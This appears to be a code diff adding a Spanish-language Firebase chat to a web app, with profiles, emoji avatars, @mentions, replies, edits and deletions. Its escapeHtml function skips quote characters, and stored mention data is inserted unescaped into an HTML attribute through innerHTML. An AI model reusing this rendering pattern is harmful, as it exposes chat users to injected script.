+    // ========== CHAT CORREGIDO ==========
+    let chatDisplayName = "", chatAvatar = "🦁";
+    let currentReplyTo = null;
+    let chatUnsubscribe = null;
+
+    function getUserColor(email) {
+        let hash = 0;
+        for (let i = 0; i < email.length; i++) hash = ((hash << 5) - hash) + email.charCodeAt(i);
+        return `hsl(${Math.abs(hash % 360)}, 70%, 60%)`;
+    }
+
+    async function cargarPerfilUsuario(email) {
+        const perfilRef = db.ref(`chat_profiles/${currentUser.uid}`);
+        const snapshot = await perfilRef.once('value');
+        if (snapshot.exists()) {
+            chatDisplayName = snapshot.val().name || email.split('@')[0];
+            chatAvatar = snapshot.val().avatar || "🦁";
+        } else {
+            chatDisplayName = email.split('@')[0];
+            chatAvatar = "🦁";
+            await perfilRef.set({ name: chatDisplayName, avatar: chatAvatar });
+        }
+        document.getElementById('displayName').value = chatDisplayName;
+        document.getElementById('avatarSelect').textContent = chatAvatar;
+    }
+
+    document.getElementById('saveProfileBtn').addEventListener('click', async () => {
+        const newName = document.getElementById('displayName').value.trim();
+        if (newName) chatDisplayName = newName;
+        chatAvatar = document.getElementById('avatarSelect').textContent;
+        await db.ref(`chat_profiles/${currentUser.uid}`).set({ name: chatDisplayName, avatar: chatAvatar });
+        alert("Perfil actualizado");
+    });
+
+    document.getElementById('avatarSelect').addEventListener('click', () => {
+        let newEmoji = prompt("Elige un emoji (puedes copiar y pegar):", chatAvatar);
+        if (newEmoji && newEmoji.trim()) document.getElementById('avatarSelect').textContent = newEmoji.trim();
+    });
+
+    function escapeHtml(str) {
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    function formatMessageText(text, mentions) {
+        let html = escapeHtml(text);
+        mentions.forEach(m => {
+            const regex = new RegExp(`@${m.userName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`, 'g');
+            html = html.replace(regex, `<span class="mention" data-userid="${m.userId}">@${escapeHtml(m.userName)}</span>`);
+        });
+        return html;
+    }
+
+    function renderizarMensajes(messages) {
+        const container = document.getElementById('chatMessages');
+        if (!container) return;
+        container.innerHTML = '';
+        for (const msg of messages) {
+            const userColor = getUserColor(msg.userId);
+            const replyHtml = msg.replyTo ? `<div class="reply-preview">↩️ Respondiendo a <strong style="color:${getUserColor(msg.replyTo.userId)}">${escapeHtml(msg.replyTo.userName)}</strong>: ${escapeHtml(msg.replyTo.text.substring(0,50))}</div>` : '';
+            const msgDiv = document.createElement('div');
+            msgDiv.className = `chat-message ${msg.replyTo ? 'replying' : ''}`;
+            msgDiv.style.setProperty('--user-color', userColor);
+            msgDiv.dataset.id = msg.id;
+            msgDiv.innerHTML = `
+                <div class="message-header">
+                    <span class="message-avatar">${escapeHtml(msg.avatar || '🦁')}</span>
+                    <span class="message-name" style="color:${userColor}">${escapeHtml(msg.userName)}</span>
+                    <span class="message-time">${new Date(msg.timestamp).toLocaleString()}</span>
+                </div>
+                ${replyHtml}
+                <div class="message-text">${formatMessageText(msg.text, msg.mentions || [])}</div>
+                <div class="message-actions">
+                    <button class="msg-btn reply-btn" title="Responder">💬</button>
+                    ${(currentUser.role === 'Owner' || msg.userId === currentUser.uid) ? `<button class="msg-btn edit-btn" title="Editar">✏️</button><button class="msg-btn delete-btn" title="Eliminar">🗑️</button>` : ''}
+                </div>
+            `;
+            msgDiv.querySelector('.reply-btn').onclick = () => {
+                currentReplyTo = { id: msg.id, userName: msg.userName, text: msg.text };
+                document.getElementById('replyBadge').style.display = 'flex';
+                document.getElementById('replyBadge').querySelector('span').innerHTML = `Respondiendo a ${escapeHtml(msg.userName)}: ${escapeHtml(msg.text.substring(0,40))}`;
+            };
+            if (msgDiv.querySelector('.edit-btn')) {
+                msgDiv.querySelector('.edit-btn').onclick = () => editarMensaje(msg.id, msg.text);
+            }
+            if (msgDiv.querySelector('.delete-btn')) {
+                msgDiv.querySelector('.delete-btn').onclick = () => eliminarMensaje(msg.id);
+            }
+            container.appendChild(msgDiv);
+        }
+        container.scrollTop = container.scrollHeight;
+    }
+
+    async function enviarMensaje() {
+        const input = document.getElementById('chatInput');
+        let text = input.value.trim();
+        if (!text) return;
+
+        // Detectar menciones
+        const mentionRegex = /@(\w+)/g;
+        let match;
+        const mentions = [];
+        while ((match = mentionRegex.exec(text)) !== null) {
+            const mentionedName = match[1];
+            const snapshot = await db.ref('chat_profiles').once('value');
+            let found = null;
+            snapshot.forEach(prof => {
+                if (prof.val().name.toLowerCase() === mentionedName.toLowerCase()) {
+                    found = { userId: prof.key, userName: prof.val().name };
+                }
+            });
+            if (found && !mentions.some(m => m.userId === found.userId)) {
+                mentions.push(found);
+            }
+        }
+
+        const msgData = {
+            userId: currentUser.uid,
+            userName: chatDisplayName,
+            avatar: chatAvatar,
+            text: text,
+            timestamp: Date.now(),
+            mentions: mentions
+        };
+        if (currentReplyTo) {
+            msgData.replyTo = {
+                id: currentReplyTo.id,
+                userId: currentReplyTo.userId,
+                userName: currentReplyTo.userName,
+                text: currentReplyTo.text.substring(0, 100)
+            };
+            currentReplyTo = null;
+            document.getElementById('replyBadge').style.display = 'none';
+        }
+        await db.ref('chat_messages').push(msgData);
+        input.value = '';
+    }
+
+    async function editarMensaje(msgId, oldText) {
+        const newText = prompt("Editar mensaje:", oldText);
+        if (newText && newText !== oldText) {
+            await db.ref(`chat_messages/${msgId}`).update({ text: newText, edited: true });
+        }
+    }
+
+    async function eliminarMensaje(msgId) {
+        if (confirm("¿Eliminar este mensaje?")) {
+            await db.ref(`chat_messages/${msgId}`).remove();
+        }
+    }
+
+    function iniciarChat() {
+        if (chatUnsubscribe) chatUnsubscribe();
+        const messagesRef = db.ref('chat_messages').orderByChild('timestamp').limitToLast(200);
+        chatUnsubscribe = messagesRef.on('value', (snapshot) => {
+            const messages = [];
+            snapshot.forEach(child => {
+                messages.push({ id: child.key, ...child.val() });
+            });
+            messages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
+            renderizarMensajes(messages);
+        });
+    }
+
+    document.getElementById('sendMsgBtn').addEventListener('click', enviarMensaje);
+    document.getElementById('chatInput').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter' && !e.shiftKey) {
+            e.preventDefault();
+            enviarMensaje();
+        }
+    });
+    document.getElementById('cancelReplyBtn').addEventListener('click', () => {
+        currentReplyTo = null;
+        document.getElementById('replyBadge').style.display = 'none';
+    });
+    function cargarMensajesChat() {} // placeholder
 
     // ========== JUEGO ==========
     let gameScore=0,gameMisses=0;
